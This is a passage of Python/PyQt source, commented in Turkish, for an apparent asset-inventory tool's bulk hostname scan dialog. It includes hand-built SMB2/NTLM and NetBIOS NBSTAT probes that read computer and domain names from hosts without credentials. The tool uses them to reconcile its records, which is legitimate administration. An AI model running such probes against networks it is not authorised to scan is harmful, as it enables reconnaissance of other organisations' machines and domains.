                verified   = smb_domain
                source     = "dns_suffix+actual_membership"
                confidence = "HIGH"
            else:
                source     = "conflict"
                confidence = "LOW"
        elif smb_domain:
            verified   = smb_domain
            source     = "actual_membership"
            confidence = "HIGH"
        elif ptr_has_fqdn and ptr_domain:
            verified   = ptr_domain
            source     = "dns_suffix"
            confidence = "MEDIUM"
        else:
            source     = "unknown"
            confidence = "LOW"

        return short, verified, "", source, confidence


    @staticmethod
    def _query_smb_ntlm(ip: str, timeout: float = 2.0) -> tuple[str, str]:
        """SMB2 + NTLM Negotiate ile domain adini oku. Credential gerekmez.
        TCP 445 -> SMB2 Negotiate -> SessionSetup(NTLM_NEG) -> NTLM_CHALLENGE
        NTLM Challenge icinde MsvAvDnsDomainName -> kesin DNS domain adi.
        Returns: (dns_domain, netbios_domain)
        """
        import struct as _st

        def _make_ntlm_negotiate():
            flags = (0x00000001 | 0x00000002 | 0x00000004 | 0x00000200 |
                     0x00008000 | 0x00020000 | 0x00800000 | 0x02000000 | 0x80000000)
            sig   = bytes([0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00])  # NTLMSSP\0
            return sig + _st.pack('<III', 1, flags, 0) + bytes(24)

        def _der_tlv(tag, val):
            n = len(val)
            if n < 128:
                return bytes([tag, n]) + val
            return bytes([tag, 0x81, n]) + val

        def _spnego_wrap(blob):
            # NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
            oid = bytes([0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a])
            mech    = _der_tlv(0x30, _der_tlv(0x06, oid))
            mech_a0 = _der_tlv(0xa0, mech)
            ntlm_a2 = _der_tlv(0xa2, _der_tlv(0x04, blob))
            seq     = _der_tlv(0x30, mech_a0 + ntlm_a2)
            return _der_tlv(0x60, bytes([0x06, 0x00]) + seq)

        def _smb2_header(cmd, msg_id):
            # SMB2 magic: 0xFE + "SMB"
            magic = bytes([0xfe, 0x53, 0x4d, 0x42])
            return (magic
                    + _st.pack('<HHHHHII', 64, 0, 0, 0, cmd, 31, 0)
                    + _st.pack('<QIIq', msg_id, 0, 0xffffffff, 0)
                    + bytes(16))

        def _nb_wrap(data):
            return _st.pack('>I', len(data)) + data

        def _parse_challenge(data):
            sig = bytes([0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00])
            idx = data.find(sig)
            if idx < 0: return '', ''
            m = data[idx:]
            if len(m) < 56: return '', ''
            if _st.unpack_from('<I', m, 8)[0] != 2: return '', ''
            # TargetName
            tl, _, to = _st.unpack_from('<HHI', m, 12)
            nb_name = ''
            try: nb_name = m[to:to+tl].decode('utf-16-le')
            except: pass
            # TargetInfo AvPairs
            il, _, io = _st.unpack_from('<HHI', m, 40)
            dns_name = ''
            if il and io + il <= len(m):
                av, p = m[io:io+il], 0
                while p + 4 <= len(av):
                    aid = _st.unpack_from('<H', av, p)[0]
                    alen = _st.unpack_from('<H', av, p + 2)[0]
                    p += 4
                    v = av[p:p+alen]
                    if aid == 4:              # MsvAvDnsDomainName (kesin)
                        try: dns_name = v.decode('utf-16-le')
                        except: pass
                    elif aid == 2 and not dns_name:  # MsvAvNbDomainName (yedek)
                        try: dns_name = v.decode('utf-16-le')
                        except: pass
                    elif aid == 0: break
                    p += alen
            return dns_name.lower(), nb_name.upper()

        try:
            sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sk.settimeout(timeout)
            sk.connect((ip, 445))

            # 1. SMB2 Negotiate (dialects: 2.0.2 ve 2.1)
            dialects = bytes([0x02, 0x02, 0x10, 0x02])
            neg_body  = (_st.pack('<HHH', 36, 2, 1)
                         + bytes(18)             # GUID + Capabilities
                         + _st.pack('<III', 0x7f, 0x800000, 0x800000)
                         + bytes(16)             # SystemTime + StartTime
                         + dialects)
            sk.sendall(_nb_wrap(_smb2_header(0, 0) + neg_body))
            sk.recv(4096)

            # 2. SessionSetup + NTLMSSP_NEGOTIATE
            spnego  = _spnego_wrap(_make_ntlm_negotiate())
            sec_off = 64 + 24        # SMB2 header(64) + fixed fields(24) = 88 byte offset
            ss_body = (_st.pack('<HBBIIQQHH',
                                25, 0, 1, 0x7f, 0, sec_off, 0, len(spnego), 0, 0)
                       + spnego)
            sk.sendall(_nb_wrap(_smb2_header(1, 1) + ss_body))

            r2 = b''
            sig_bytes = bytes([0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00])
            for _ in range(10):
                chunk = sk.recv(4096)
                if not chunk: break
                r2 += chunk
                if sig_bytes in r2: break
            sk.close()
            return _parse_challenge(r2)
        except Exception:
            return '', ''

    @staticmethod
    def _query_netbios(ip: str, timeout: float = 1.2) -> tuple[str, str, str]:
        """NetBIOS Name Service NBSTAT sorgusu (UDP 137).

        Returns: (computer_name, domain_or_workgroup, type)
        type: 'domain' (Active Directory) | 'workgroup' | ''
        """
        # Wildcard '*' için NetBIOS encoded name:
        # '*' = 0x2A → high nibble: 0x41+2=0x43='C', low nibble: 0x41+0xA=0x4B='K'
        # Geri kalan 15 byte 0x00 → 'AA' * 15
        encoded = b'CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'[:32]

        packet = (
            b'\xab\xcd'       # Transaction ID
            b'\x00\x00'       # Flags: standart sorgu
            b'\x00\x01'       # Questions: 1
            b'\x00\x00\x00\x00\x00\x00'  # RR sayıları: hepsi 0
            b'\x20'           # İsim uzunluğu: 32
            + encoded
            + b'\x00'         # İsim sonu
            b'\x00\x21'       # Tip: NBSTAT
            b'\x00\x01'       # Sınıf: IN
        )

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(packet, (ip, 137))
            data, _ = s.recvfrom(1024)
            s.close()
        except Exception:
            return "", "", ""

        return HostnameScanThread._parse_nbstat(data)

    @staticmethod
    def _parse_nbstat(data: bytes) -> tuple[str, str, str]:
        """NetBIOS NBSTAT yanıtını ayrıştır."""
        import struct as _struct
        if not data or len(data) < 57:
            return "", "", ""
        try:
            # Header'ı (12 byte) atla, ardından soru bölümünü geç
            offset = 12
            name_len = data[offset]
            offset  += 1 + name_len + 1   # length + encoded name + null
            offset  += 4                   # qtype + qclass

            # Yanıt RR: aynı name formatı + type + class + TTL + rdlength
            if offset >= len(data):
                return "", "", ""
            name_len2 = data[offset]
            offset   += 1 + name_len2 + 1
            offset   += 10                 # atype(2) + aclass(2) + ttl(4) + rdlen(2)

            if offset >= len(data):
                return "", "", ""

            num_names = data[offset]
            offset   += 1

            computer_name = ""
            workgroup     = ""
            ad_domain     = ""

            for _ in range(num_names):
                if offset + 18 > len(data):
                    break
                name_bytes = data[offset:offset + 15]
                name_type  = data[offset + 15]
                flags      = _struct.unpack('>H', data[offset + 16:offset + 18])[0]
                is_group   = bool(flags & 0x8000)
                offset    += 18

                try:
                    name = name_bytes.decode('ascii').rstrip()
                except Exception:
                    continue

                if not name:
                    continue

                # Tür 0x00, UNIQUE → bilgisayar adı
                if name_type == 0x00 and not is_group and not computer_name:
                    computer_name = name.upper()
                # Tür 0x1C, GROUP → AD domain controller grubu (en güvenilir)
                elif name_type == 0x1C and is_group:
                    ad_domain = name.upper()
                # Tür 0x00, GROUP → Workgroup / Domain adı
                elif name_type == 0x00 and is_group and not workgroup:
                    workgroup = name.upper()
                # Tür 0x1E, GROUP → Browser election (yedek)
                elif name_type == 0x1E and is_group and not workgroup:
                    workgroup = name.upper()

            if ad_domain:
                return computer_name, ad_domain, 'domain'
            elif workgroup:
                return computer_name, workgroup, 'workgroup'
            return computer_name, "", ""

        except Exception:
            return "", "", ""


class HostnameScanDialog(QDialog):
    """
    Toplu Hostname Tarama ve Güncelleme Diyaloğu

    Durum mantığı (status_key):
        'guncel'    – hostname aynı, değişmemiş
        'eski_eski' – değişti, her iki format da ESKİ (ad-soyad)
        'eski_yeni' – değişti, ESKİ → YENİ (B1504 vb.) ← kritik!
        'yeni_eski' – değişti, YENİ → ESKİ
        'yeni_yeni' – değişti, her iki format da YENİ
        'bulunamadi'– DNS çözümlenemedi
    """

    # ── Sütun sabitleri ──────────────────────────────────────────────── #
    C_CHK    = 0
    C_NAME   = 1
    C_TYPE   = 2
    C_IP     = 3
    C_OLD    = 4
    C_OFMT   = 5
    C_NEW    = 6
    C_NFMT   = 7
    C_DOMAIN = 8
    C_CONF   = 9   # Güven seviyesi (HIGH/MEDIUM/LOW)
    C_STAT   = 10

    HEADERS = ["✓", "Varlık Adı", "Tür", "IP Adresi",
               "Kayıtlı Hostname", "Format",
               "Ağdan Gelen Hostname", "Format",
               "Etki Alanı", "Güven",
               "Durum"]

    # ── Durum tanımları: (etiket, ön plan rengi, arka plan rengi) ─────── #
    STATUS_DEF = {
        "guncel":      ("✅  Değişmemiş",              "#00ff88", "#0a160a"),
        "eski_eski":   ("🔄  Ad değişti (eski→eski)",  "#f1c40f", "#171200"),
        "eski_yeni":   ("⬆️  Yeni formata geçti",      "#f39c12", "#1e1000"),
        "yeni_eski":   ("⬇️  Eski formata döndü",      "#e74c3c", "#160505"),
        "yeni_yeni":   ("🔄  Hostname değişti",        "#f1c40f", "#171200"),
        "migrated":    ("🚀  Domain'e taşındı",         "#a855f7", "#160a2a"),
        "ambiguous":   ("⚠️  Manuel kontrol",           "#e67e22", "#1a0e00"),
        "bulunamadi":  ("❌  Bulunamadı",               "#e74c3c", "#160505"),
    }

    # ── Format etiket tanımları ───────────────────────────────────────── #
    FMT_DEF = {
        "eski": ("🔴  Eski (ad-soyad)", "#e74c3c"),
        "yeni": ("🟢  Yeni (B1504 vb.)", "#2ecc71"),
        "":     ("—",                   "#555555"),
    }

    STYLE = """
        QDialog          { background: #0a0a14; }
        QLabel           { color: white; }
        QTableWidget     { background: #16213e; border: 1px solid #0f3460;
                           font-size: 11px; color: white; gridline-color: #0f3460; }
        QHeaderView::section { background: #0f3460; color: #00ff88;
                               padding: 5px; font-size: 10px; font-weight: bold; }
        QTableWidget::item:selected { background: #1a3a6a; }
        QPushButton      { background: #16213e; color: #00ff88; padding: 7px 14px;
                           border: 1px solid #0f3460; border-radius: 5px; font-size: 11px; }
        QPushButton:hover   { background: #0f3460; }
        QPushButton:disabled{ color: #444; border-color: #333; }
        QProgressBar     { background: #16213e; border: 1px solid #0f3460;
                           border-radius: 5px; height: 18px; text-align: center; color: white; }
        QProgressBar::chunk { background: #1abc9c; border-radius: 4px; }
        QCheckBox        { color: white; spacing: 5px; }
        QComboBox        { background: #16213e; color: white; border: 1px solid #0f3460;
                           border-radius: 4px; padding: 4px; min-width: 170px; }
        QLineEdit        { background: #16213e; color: white; border: 1px solid #0f3460;
                           border-radius: 4px; padding: 4px; }
    """

    # ── Filtre seçenekleri: (etiket, lambda(info)->bool) ─────────────── #
    FILTERS = [
        ("Tümü",                         lambda i: True),
        ("✅ Değişmemiş",                lambda i: i.get("sk") == "guncel"),
        ("⬆️ Eski→Yeni",                 lambda i: i.get("sk") == "eski_yeni"),
        ("🚀 Domain'e Taşındı",          lambda i: i.get("sk") == "migrated"),
        ("🔄 Diğer değişen",             lambda i: i.get("sk") in ("eski_eski","yeni_eski","yeni_yeni")),
        ("⚠️ Manuel Kontrol",            lambda i: i.get("sk") == "ambiguous"),
        ("❌ Bulunamadı",                lambda i: i.get("sk") == "bulunamadi"),
        ("🟢 Otomatik güncellenebilir",  lambda i: (
            i.get("sk") in ("eski_yeni","migrated")
            and i.get("confidence") in ("HIGH","MEDIUM"))),
    ]

    def __init__(self, parent, assets, org):
        super().__init__(parent)
        self.assets  = assets
        self.org     = org
        self.results = {}          # asset_id → info dict
        # Bilinen etki alanlarını settings'ten al
        settings = getattr(parent.window() if hasattr(parent, 'window') else parent,
                           'settings', None)
        self.known_domains = []
        if settings:
            for key in ('domain1', 'domain2'):
                d = settings.get(key, '').strip().lower()
                if d:
                    self.known_domains.append(d)
        self.setWindowTitle(f"🖥️  Hostname Tarama  —  {len(assets)} varlık")
        self.setMinimumSize(1200, 680)
        self.setStyleSheet(self.STYLE)
        self._build_ui()

    def _save_domains(self):
        """Girilen etki alanlarını settings'e kaydet."""
        d1 = self.domain1_edit.text().strip().lower()
        d2 = self.domain2_edit.text().strip().lower()
        self.known_domains = [d for d in [d1, d2] if d]
        main = self.parent()
        settings = getattr(
            main.window() if hasattr(main, 'window') else main,
            'settings', None)
        if settings:
            settings.set('domain1', d1)
            settings.set('domain2', d2)
        self.status_lbl.setText(
            "✅  Etki alanları kaydedildi — bir sonraki taramada kullanılacak")

    def _get_active_domains(self) -> list[str]:
        """UI'dan güncel domain listesini döndür."""
        d1 = self.domain1_edit.text().strip().lower()
        d2 = self.domain2_edit.text().strip().lower()
        return [d for d in [d1, d2] if d]

    # ══════════════════════════════════════════════════════════════════ #
    #  UI İnşası
    # ══════════════════════════════════════════════════════════════════ #
    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setSpacing(8)
        root.setContentsMargins(12, 12, 12, 12)

        # ── Üst bar ─────────────────────────────────────────────────── #
        top = QHBoxLayout()
        self.status_lbl = QLabel(f"⏳  {len(self.assets)} varlık taranıyor…")
        self.status_lbl.setStyleSheet("color:#00d4ff;font-size:13px;font-weight:bold;")
        top.addWidget(self.status_lbl)
        top.addStretch()

        top.addWidget(QLabel("Filtre:"))
        self.filter_cb = QComboBox()
        for label, _ in self.FILTERS:
            self.filter_cb.addItem(label)
        self.filter_cb.currentIndexChanged.connect(self._apply_filter)
        top.addWidget(self.filter_cb)

        self.search_box = QLineEdit()
        self.search_box.setPlaceholderText("Ad / IP / Hostname ara…")
        self.search_box.setFixedWidth(210)
        self.search_box.textChanged.connect(self._apply_filter)
        top.addWidget(self.search_box)
        root.addLayout(top)

        # ── İlerleme çubuğu ─────────────────────────────────────────── #
        self.progress_bar = QProgressBar()
        self.progress_bar.setMaximum(len(self.assets))
        self.progress_bar.setValue(0)
        root.addWidget(self.progress_bar)

        # ── Özet kartlar ────────────────────────────────────────────── #
        cards = QHBoxLayout()
        self.card_total    = self._stat_card("Toplam",              str(len(self.assets)), "#00d4ff")
        self.card_guncel   = self._stat_card("✅ Değişmemiş",       "—",                   "#00ff88")
        self.card_e2y      = self._stat_card("⬆️ Eski→Yeni",        "—",                   "#f39c12")
        self.card_other    = self._stat_card("🔄 Diğer değişen",    "—",                   "#f1c40f")
        self.card_notfound = self._stat_card("❌ Bulunamadı",       "—",                   "#e74c3c")
        self.card_domains  = self._stat_card("🌐 Etki Alanı",       "—",                   "#00d4ff")
        self.card_domains.setToolTip("Taramada bulunan benzersiz etki alanları")
        for c in (self.card_total, self.card_guncel, self.card_e2y,
                  self.card_other, self.card_notfound, self.card_domains):
            cards.addWidget(c)
        cards.addStretch()
        root.addLayout(cards)

        # ── Etki Alanı Ayarları ─────────────────────────────────────── #
        domain_row = QHBoxLayout()
        dom_icon = QLabel("🌐")
        dom_icon.setStyleSheet("font-size:14px;")
        domain_row.addWidget(dom_icon)
        dom_lbl = QLabel("Bilinen Etki Alanları:")
        dom_lbl.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:11px;")
        domain_row.addWidget(dom_lbl)

        self.domain1_edit = QLineEdit()
        self.domain1_edit.setPlaceholderText("Etki Alanı 1  (örn: sirket.local)")
        self.domain1_edit.setFixedWidth(220)
        self.domain1_edit.setStyleSheet(
            "QLineEdit{background:#0f1a30;border:1px solid #00d4ff66;"
            "border-radius:5px;padding:4px 8px;color:#00d4ff;font-size:11px;}"
            "QLineEdit:focus{border-color:#00d4ff;}")
        if self.known_domains:
            self.domain1_edit.setText(self.known_domains[0])
        domain_row.addWidget(self.domain1_edit)

        domain_row.addWidget(QLabel("  /  "))

        self.domain2_edit = QLineEdit()
        self.domain2_edit.setPlaceholderText("Etki Alanı 2  (örn: sirket2.local)")
        self.domain2_edit.setFixedWidth(220)
        self.domain2_edit.setStyleSheet(
            "QLineEdit{background:#0f1a30;border:1px solid #9b59b666;"
            "border-radius:5px;padding:4px 8px;color:#d7bde2;font-size:11px;}"
            "QLineEdit:focus{border-color:#9b59b6;}")
        if len(self.known_domains) > 1:
            self.domain2_edit.setText(self.known_domains[1])
        domain_row.addWidget(self.domain2_edit)

        btn_save_domains = QPushButton("💾 Kaydet")
        btn_save_domains.setFixedWidth(80)
        btn_save_domains.setToolTip("Etki alanlarını ayarlara kaydet (kalıcı)")
        btn_save_domains.setStyleSheet(
            "QPushButton{background:#0f3460;color:#00d4ff;border:1px solid #00d4ff55;"
            "border-radius:5px;padding:4px 10px;font-size:10px;}"
            "QPushButton:hover{background:#00d4ff;color:#0a0a14;}")
        btn_save_domains.clicked.connect(self._save_domains)
        domain_row.addWidget(btn_save_domains)

        domain_row.addStretch()
        domain_tip = QLabel("  💡 Bilinen etki alanları DNS önceliğiyle eşleştirilir")
        domain_tip.setStyleSheet("color:#555;font-size:9px;font-style:italic;")
        domain_row.addWidget(domain_tip)
        root.addLayout(domain_row)

        # ── Legend ──────────────────────────────────────────────────── #
        leg = QLabel(
            "  🔴 Eski format → yalnızca harf içerir  (AHMET.KAYA, MUHASEBE …)"
            "     🟢 Yeni format → harf + rakam karışık  (B1504, PC-A3F2, WS-B7K9 …)"
        )
        leg.setStyleSheet(
            "color:#888;font-size:10px;background:#0f1a30;"
            "border:1px solid #0f3460;border-radius:4px;padding:4px 10px;"
        )
        root.addWidget(leg)

        # ── Tablo ───────────────────────────────────────────────────── #
        self.table = QTableWidget()
        self.table.setColumnCount(11)
        self.table.setHorizontalHeaderLabels(self.HEADERS)
        hh = self.table.horizontalHeader()
        for col, w in [(self.C_CHK,28),(self.C_NAME,130),(self.C_TYPE,75),
                       (self.C_IP,105),(self.C_OLD,145),(self.C_OFMT,110),
                       (self.C_NEW,145),(self.C_NFMT,110),
                       (self.C_DOMAIN,135),(self.C_CONF,70)]:
            hh.resizeSection(col, w)
        hh.setSectionResizeMode(self.C_STAT, QHeaderView.ResizeMode.Stretch)
        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setAlternatingRowColors(True)
        self.table.setSortingEnabled(True)
        root.addWidget(self.table)

        # ── Alt buton satırı ────────────────────────────────────────── #
        btns = QHBoxLayout()

        self.chk_all = QCheckBox("Tümünü seç")
        self.chk_all.stateChanged.connect(self._toggle_all)
        btns.addWidget(self.chk_all)

        btn_sel_changed = QPushButton("🔄 Tüm değişenleri seç")
        btn_sel_changed.clicked.connect(lambda: self._quick_select(
            lambda i: i.get("sk") not in ("guncel", "bulunamadi", "")))
        btns.addWidget(btn_sel_changed)

        btn_sel_e2y = QPushButton("⬆️ Eski→Yeni seç")
        btn_sel_e2y.setStyleSheet(
            "QPushButton{background:#1e1000;color:#f39c12;border:1px solid #f39c12;"
            "border-radius:5px;padding:7px 12px;font-weight:bold;}"
            "QPushButton:hover{background:#2a1800;}"
        )
        btn_sel_e2y.clicked.connect(lambda: self._quick_select(
            lambda i: i.get("sk") == "eski_yeni"))
        btns.addWidget(btn_sel_e2y)

        btns.addStretch()

        self.apply_btn = QPushButton("✅  Seçilenleri Güncelle")
        self.apply_btn.setStyleSheet(
            "QPushButton{background:#1abc9c;color:white;padding:8px 20px;"
            "border:none;border-radius:5px;font-weight:bold;font-size:12px;}"
            "QPushButton:hover{background:#16a085;}"
            "QPushButton:disabled{background:#333;color:#555;}"
        )
        self.apply_btn.setEnabled(False)
        self.apply_btn.clicked.connect(self._apply_updates)
        btns.addWidget(self.apply_btn)

        self.rescan_btn = QPushButton("🔄  Yeniden Tara")
        self.rescan_btn.clicked.connect(self._start_scan)
        btns.addWidget(self.rescan_btn)

        close_btn = QPushButton("Kapat")
        close_btn.clicked.connect(self.close)
        btns.addWidget(close_btn)
        root.addLayout(btns)

        self._start_scan()

    # ══════════════════════════════════════════════════════════════════ #
    #  Yardımcı widget: istatistik kartı
    # ══════════════════════════════════════════════════════════════════ #
    def _stat_card(self, title, value, color):
        w = QWidget()
        l = QVBoxLayout(w)
        l.setContentsMargins(10, 6, 10, 6)
        l.setSpacing(2)
        v = QLabel(value)
        v.setStyleSheet(f"color:{color};font-size:20px;font-weight:bold;")
        v.setAlignment(Qt.AlignmentFlag.AlignCenter)
        t = QLabel(title)
        t.setStyleSheet("color:#888;font-size:10px;")
        t.setAlignment(Qt.AlignmentFlag.AlignCenter)
        l.addWidget(v); l.addWidget(t)
        w.setStyleSheet(
            "background:#16213e;border:1px solid #0f3460;"
            "border-radius:8px;min-width:110px;"
        )
        w._val = v
        return w

    # ── Format hücresi ───────────────────────────────────────────────── #
    def _fmt_item(self, fmt_key):
        label, color = self.FMT_DEF.get(fmt_key, ("—", "#555555"))
        it = QTableWidgetItem(label)
        it.setForeground(QColor(color))
        it.setData(Qt.ItemDataRole.UserRole + 1, fmt_key)
        return it

    # ── Durum hücresi ────────────────────────────────────────────────── #
    def _stat_item(self, status_key):
        label, fg, _ = self.STATUS_DEF.get(status_key, ("—", "#888", "#0a0a14"))
        it = QTableWidgetItem(label)
        it.setForeground(QColor(fg))
        return it

    # ══════════════════════════════════════════════════════════════════ #
    #  Tarama
    # ══════════════════════════════════════════════════════════════════ #
    def _start_scan(self):
        self.results = {}
        self.table.setRowCount(0)
        self.table.setSortingEnabled(False)   # Tarama boyunca sorting kapalı
        self.progress_bar.setValue(0)
        self.apply_btn.setEnabled(False)
        self.rescan_btn.setEnabled(False)
        self.status_lbl.setText(f"⏳  {len(self.assets)} varlık taranıyor…")

        for asset in self.assets:
            cfg     = asset.get_type_config()
            old_hn  = asset.hostname or ""
            old_fmt = detect_hostname_format(old_hn)
            row     = self.table.rowCount()
            self.table.insertRow(row)

            # Checkbox
            chk = QTableWidgetItem()
            chk.setFlags(Qt.ItemFlag.ItemIsUserCheckable | Qt.ItemFlag.ItemIsEnabled)
            chk.setCheckState(Qt.CheckState.Unchecked)
            chk.setData(Qt.ItemDataRole.UserRole, asset.id)
            self.table.setItem(row, self.C_CHK, chk)

            # Ad
            nm = QTableWidgetItem(asset.name)
            nm.setForeground(QColor(cfg["color"]))
            self.table.setItem(row, self.C_NAME, nm)

            # Tür
            self.table.setItem(row, self.C_TYPE,
                QTableWidgetItem(cfg["icon"] + "  " + cfg["name"]))

            # IP
            ip_it = QTableWidgetItem(asset.ip_address)
            ip_it.setForeground(QColor("#00d4ff"))
            self.table.setItem(row, self.C_IP, ip_it)

            # Kayıtlı hostname
            self.table.setItem(row, self.C_OLD,
                QTableWidgetItem(old_hn if old_hn else "—"))

            # Kayıtlı format
            self.table.setItem(row, self.C_OFMT, self._fmt_item(old_fmt))

            # Yeni hostname (bekleniyor)
            wait = QTableWidgetItem("⏳  Bekleniyor…")
            wait.setForeground(QColor("#555"))
            self.table.setItem(row, self.C_NEW, wait)

            # Yeni format (bekleniyor)
            self.table.setItem(row, self.C_NFMT, self._fmt_item(""))

            # Durum (bekleniyor)
            self.table.setItem(row, self.C_DOMAIN, QTableWidgetItem(""))
            self.table.setItem(row, self.C_CONF,   QTableWidgetItem(""))
            self.table.setItem(row, self.C_STAT,   QTableWidgetItem(""))

            self.results[asset.id] = {
                "ip":              asset.ip_address,
                "old":             old_hn,
                "old_fmt":         old_fmt,
                "old_domain":      getattr(asset, 'domain', ''),
                "new":             None,      # ağdan gelen hostname
                "new_fmt":         "",
                "verified_domain": "",        # kanıta dayalı domain
                "predicted_domain":"",        # pattern tahmini
                "domain_source":   "",        # nereden doğrulandı
                "confidence":      "",
                "sk":              "",
                "row":             row,
            }

        # Aktif domain listesini thread'de kullanılmak üzere asset'lere ata
        # (thread bağımsız çalıştığı için dialog referansı veremeyiz;
        #  domain listesini HostnameScanThread'e parametre olarak geçiyoruz)
        active_domains = self._get_active_domains()
        self.thread = HostnameScanThread(self.assets, known_domains=active_domains)
        self.thread.result.connect(self._on_result)
        self.thread.finished_signal.connect(self._on_finished)
        self.thread.progress.connect(self.progress_bar.setValue)
        self.thread.start()

    # ══════════════════════════════════════════════════════════════════ #
    #  Sonuç işleme
    # ══════════════════════════════════════════════════════════════════ #
    def _on_result(self, asset_id, ip, resolved,
                   verified_domain, predicted_domain, domain_source, confidence):
        info = self.results.get(asset_id)
        if info is None:
            return

        old        = info["old"]
        old_fmt    = info["old_fmt"]
        old_domain = info.get("old_domain", "").lower().strip()
        new_fmt    = detect_hostname_format(resolved)

        # Normalize
        old_short = old.split('.')[0].upper() if old else ""
        new_short = resolved.upper() if resolved else ""
        changed_hn = bool(resolved) and new_short != old_short

        # Domain değişim tespiti — SADECE doğrulanmış domain ile karşılaştır
        vd_low     = verified_domain.lower().strip() if verified_domain else ""
        changed_dm = (bool(vd_low) and bool(old_domain) and vd_low != old_domain)

        # ── Değişim sınıflandırması ──────────────────────────────────────
        if not resolved:
            sk = "bulunamadi"
        elif confidence == "LOW" and not verified_domain:
            # Doğrulanamadı — otomatik güncelleme yapılmaz
            sk = "ambiguous"
        elif "conflict" in domain_source:
            sk = "ambiguous"
        elif not changed_hn and not changed_dm:
            sk = "guncel"
        elif changed_dm:
            old_is_ttk    = "merkez" in old_domain
            new_is_enerji = "enerji"    in vd_low
            if old_is_ttk and new_is_enerji:
                sk = "migrated"
            elif old_fmt == "eski" and new_fmt == "yeni":
                sk = "eski_yeni"
            else:
                sk = "yeni_yeni"
        elif changed_hn:
            sk = ("eski_yeni"  if old_fmt=="eski" and new_fmt=="yeni"  else
                  "yeni_eski"  if old_fmt=="yeni" and new_fmt=="eski"  else
                  "eski_eski"  if old_fmt=="eski" and new_fmt=="eski"  else
                  "yeni_yeni")
        else:
            sk = "guncel"

        # Sonuçları kaydet
        info.update({
            "new":              resolved,
            "new_fmt":          new_fmt,
            "verified_domain":  verified_domain,
            "predicted_domain": predicted_domain,
            "domain_source":    domain_source,
            "confidence":       confidence,
            "sk":               sk,
        })

        # Satır numarasını asset_id üzerinden bul
        row = None
        for r in range(self.table.rowCount()):
            chk_item = self.table.item(r, self.C_CHK)
            if chk_item and chk_item.data(Qt.ItemDataRole.UserRole) == asset_id:
                row = r
                info["row"] = r
                break
        if row is None:
            return

        _, fg, bg = self.STATUS_DEF.get(sk, ("", "#888", "#0a0a14"))

        # ── Ağdan gelen hostname ─────────────────────────────────────────
        new_it = QTableWidgetItem(resolved if resolved else "—")
        new_it.setForeground(QColor(fg))
        self.table.setItem(row, self.C_NEW,  new_it)
        self.table.setItem(row, self.C_NFMT, self._fmt_item(new_fmt if resolved else ""))

        # ── Etki alanı sütunu: SADECE verified_domain ────────────────────
        # Pattern tahmini buraya yazılmaz. Doğrulanamazsa "BELİRSİZ" göster.
        SOURCE_LABEL = {
            "dns_suffix":                    ("✓", "#00d4ff"),
            "actual_membership":             ("✓", "#00ff88"),
            "dns_suffix+actual_membership":  ("✓", "#00ff88"),
            "conflict":                      ("⚠", "#e74c3c"),
            "unknown":                       ("—", "#555"),
        }
        # Source'da "conflict" geçiyorsa hep kırmızı
        src_key = "conflict" if "conflict" in domain_source else domain_source.split("+")[0]
        pfx, dom_color = SOURCE_LABEL.get(src_key, ("?", "#888"))

        if verified_domain:
            dom_text = f"{pfx} {verified_domain}"
            tooltip_lines = [
                f"Doğrulanmış domain: {verified_domain}",
                f"Kaynak: {domain_source}",
                f"Güven: {confidence}",
            ]
            if predicted_domain and predicted_domain != verified_domain:
                tooltip_lines.append(f"Tahmin (pattern): {predicted_domain} ← kaynak ile çelişiyor")
            elif predicted_domain:
                tooltip_lines.append(f"Tahmin (pattern): {predicted_domain} ✓ uyumlu")
        else:
            # Doğrulanamadı
            dom_color = "#e67e22"
            pfx       = "?"
            dom_text  = "BELİRSİZ"
            tooltip_lines = [
                "Doğrulanmış domain yok",
                f"Kaynak: {domain_source}",
                f"Güven: {confidence}",
            ]
            if predicted_domain:
                tooltip_lines.append(
                    f"Tahmin (pattern): {predicted_domain}  "
                    f"— bu tahmin domain kolonuna YAZILMİYOR"
                )
            if "conflict" in domain_source:
                tooltip_lines.append("⚠ DNS ve SMB verileri çelişiyor — manuel kontrol edin")

        dom_it = QTableWidgetItem(dom_text)
        dom_it.setForeground(QColor(dom_color))
        dom_it.setToolTip("\n".join(tooltip_lines))
        self.table.setItem(row, self.C_DOMAIN, dom_it)

        # ── Güven sütunu ─────────────────────────────────────────────────
        CONF_STYLE = {"HIGH": ("HIGH","#00ff88"), "MEDIUM": ("MED","#f1c40f"), "LOW": ("LOW","#e74c3c")}
        ct, cc = CONF_STYLE.get(confidence, ("?","#888"))
        conf_it = QTableWidgetItem(ct)
        conf_it.setForeground(QColor(cc))
        conf_it.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.table.setItem(row, self.C_CONF, conf_it)

        self.table.setItem(row, self.C_STAT, self._stat_item(sk))

        # ── Satır arka planı ─────────────────────────────────────────────
        bg_color = QColor(bg)
        for col in range(self.table.columnCount()):
            it = self.table.item(row, col)
            if it:
                it.setBackground(bg_color)

        # ── Otomatik seçim: SADECE verified + HIGH/MEDIUM ────────────────
        can_auto = (
            bool(verified_domain) and
            "conflict" not in domain_source and
            confidence in ("HIGH", "MEDIUM") and
            sk in ("eski_yeni", "migrated")
        )
        if can_auto:
            chk = self.table.item(row, self.C_CHK)
            if chk:
                chk.setCheckState(Qt.CheckState.Checked)

        self._update_cards()

    def _on_finished(self, total, success):
        self.status_lbl.setText(
            f"✅  Tarama tamamlandı  —  {total} varlık  |  "
            f"{success} hostname çözüldü  |  {total - success} bulunamadı"
        )
        self.table.setSortingEnabled(True)    # Tarama bitti, sorting açılabilir
        self.apply_btn.setEnabled(True)
        self.rescan_btn.setEnabled(True)
        self._update_cards()
        self._apply_filter()

    # ══════════════════════════════════════════════════════════════════ #
    #  Kart güncelleme
    # ══════════════════════════════════════════════════════════════════ #
    def _update_cards(self):
        scanned  = [v for v in self.results.values() if v["new"] is not None]
        guncel   = sum(1 for v in scanned if v["sk"] == "guncel")
